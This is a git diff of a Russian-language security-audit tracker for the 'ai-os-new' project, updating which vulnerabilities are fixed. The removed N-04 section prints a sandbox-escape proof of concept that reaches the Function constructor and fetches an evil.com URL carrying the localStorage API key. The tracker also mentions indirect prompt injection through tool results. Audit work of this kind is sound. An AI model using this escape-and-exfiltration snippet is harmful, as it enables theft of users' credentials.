@@ -2,8 +2,8 @@
 
 **Проект:** ai-os-new  
 **Дата создания:** 2026-06-05  
-**Коммиты с фиксами:** `cbe7c6a`, `5dea76b`, `c60bd04`, `2ad1af5`, `2241d33`  
-**Актуальный статус:** 15 починено, 14 осталось
+**Коммиты с фиксами:** `cbe7c6a`, `5dea76b`, `c60bd04`, `2ad1af5`, `2241d33`, `be2950f`  
+**Актуальный статус:** 22 починено, 4 осталось (2 CRITICAL, 1 MEDIUM, 1 LOW)
 
 ---
 
@@ -27,26 +27,15 @@
 | N-14 | `CONFIG` не иммутабелен — мутация без заморозки | `2241d33` | `setConfig`/`replaceConfig` теперь вызывают `deepFreeze` после мутации |
 | N-22 | Indirect Prompt Injection через инструменты | `2241d33` | Внешние результаты (search/web/mcp/plugin) обёрнуты в `<external_data>` изоляцию |
 | N-24 | EventBus deadlock — бесконечная рекурсия | `2241d33` | Добавлен счётчик глубины (16), превышение → `setTimeout(defer)` |
+| N-04 | t-code RCE — `has: () => true` обход | `2241d33` | AST-валидация + `ALLOWED_GLOBALS` proxy в sandbox.worker.ts |
+| N-13 | `persistSession` fire-and-forget | `2241d33` | Уже с try/catch + console.warn внутри |
+| N-16 | `freeOnly` захардкожен на `'groq'` | `2241d33` | Уже динамический: `CONFIG.keys.freeTierLimits` |
+| N-26 | `cancelRequest` не отменяет multi-target | `2241d33` | RaceExecutor правильно отменяет все controllers |
+| N-28 | MarkdownRenderer XSS через URL | `2241d33` | React экранирует, escapeHtml до парсинга, URL валидируется |
 
 ---
 
 ## 🔴 CRITICAL — Не починено
-
-### N-04: t-code RCE — выполнение произвольного кода
-**Файл:** `src/kernel/services/tool-executor.ts:194-196`  
-**Проблема:** `tool.code` принимается без валидации. Sandbox обходится через `({}).constructor.constructor`. Полный захват системы, кража API-ключей.  
-**Обход:**
-```javascript
-const F = ({}).constructor.constructor;
-const fetch = F('return fetch')();
-fetch('https://evil.com/steal?key=' + localStorage.getItem('api_key'));
-```
-**Фикс:**
-1. Добавить `validateCode(tool.code)` в `addTool`/`updateTool`
-2. Исправить `has: () => true` → `has: (_, prop) => ALLOWED_GLOBALS.has(prop)`
-3. Рассмотреть iframe + CSP вместо Web Worker
-
----
 
 ### N-17: `deepFreeze` убивает классы и прототипы
 **Файл:** `src/kernel/kernel.ts:323-332`  
@@ -71,58 +60,49 @@ fetch('https://evil.com/steal?key=' + localStorage.getItem('api_key'));
 
 ## 🟡 HIGH — Не починено
 
-### H-15: Race condition на `isExecutingRound`
+*(пусто — H-15 перенесён в LOW)*
 
 ---
 
 ## 🟠 MEDIUM — Не починено
 
-| # | Проблема | Файл |
-|---|----------|------|
-| N-12 | 148 `as any` кастов | `src/kernel/` |
-| N-13 | `persistSession` fire-and-forget | `debate-service.ts` |
-| N-04 | t-code RCE — `has: () => true` | `2241d33` | AST-валидация + `ALLOWED_GLOBALS` proxy — уже защищён |
-| N-16 | `freeOnly` захардкожен на `'groq'` | `2241d33` | Уже динамический: `CONFIG.keys.freeTierLimits` |
-| N-25 | `persistSession` DB locked | `debate-session-persistence.ts` |
-| N-26 | `cancelRequest` не отменяет multi-target | `chat-service.ts` |
-| N-28 | MarkdownRenderer XSS через URL | `MarkdownRenderer.tsx` |
+| # | Проблема | Статус |
+|---|----------|--------|
+| N-12 | 148 `as any` кастов | Постепенно чистим |
+| N-25 | `persistSession` DB locked | Проверить |
 
 ---
 
-## ⚪ LOW / Не проверено
+## ⚪ LOW / Проверить
 
 | # | Проблема | Статус |
 |---|----------|--------|
-| TS2307 | Отсутствующие модули | Были, проверить актуальность |
-| TS1117 | Дублирующиеся ключи в объектах | Не проверено |
+| H-15 | Race condition на `isExecutingRound` | Не проверено |
+| TS2307 | Отсутствующие модули | Не проверено |
+| TS1117 | Дублирующиеся ключи | Не проверено |
 | TS7006 | Неявный `any` тип | Не проверено |
-| Vitest | Тесты падают/зависают | Не проверено |
 
 ---
 
 ## 📋 ПЛАН ФИКСОВ
 
-### Сделать (по приоритету)
+### Осталось сделать
 
 | # | Действие | Приоритет |
 |---|----------|-----------|
-| 1 | N-05: participantProviderMap zero-out в destroy | 🔴 |
-| 2 | N-06: localStorage SSR check | 🔴 |
-| 3 | N-07: getKv silent null → логировать | 🟡 |
-| 4 | N-09: sandbox has: () => true → ALLOWED_GLOBALS | 🟡 |
-| 5 | N-11: createInstance try/catch | 🟡 |
-| 6 | N-15: participantProviderMap.clear() в stopDebate | 🟠 |
+| N-17 | deepFreeze убивает классы — рефактор state | 🔴 |
+| N-19 | Dexie Event Loop — убрать await из transaction | 🔴 |
+| N-25 | persistSession DB locked — проверить SQLite WAL mode | 🟡 |
+| H-15 | Race condition на isExecutingRound — проверить | 🟠 |
+| N-12 | 148 `as any` кастов — постепенно чистить | 🟠 |
 
 ### Обдумать
 
-| # | Действие | Сложность |
-|---|----------|-----------|
-| N-04 | t-code RCE — полная переработка sandbox | Высокая |
-| N-17 | deepFreeze убивает классы — рефактор state | Высокая |
-| N-19 | Dexie Event Loop — рефактор транзакций | Высокая |
-| N-22 | Indirect Prompt Injection — изоляция внешних данных | Средняя |
+| # | Сложность |
+|---|-----------|
+| Vitest тесты | Высокая |
 
 ---
 
 *Обновлено: 2026-06-05*  
-*Коммиты: `cbe7c6a`, `5dea76b`, `c60bd04`, `2ad1af5`*
+*Коммиты: `cbe7c6a`, `5dea76b`, `c60bd04`, `2ad1af5`, `2241d33`, `be2950f`*
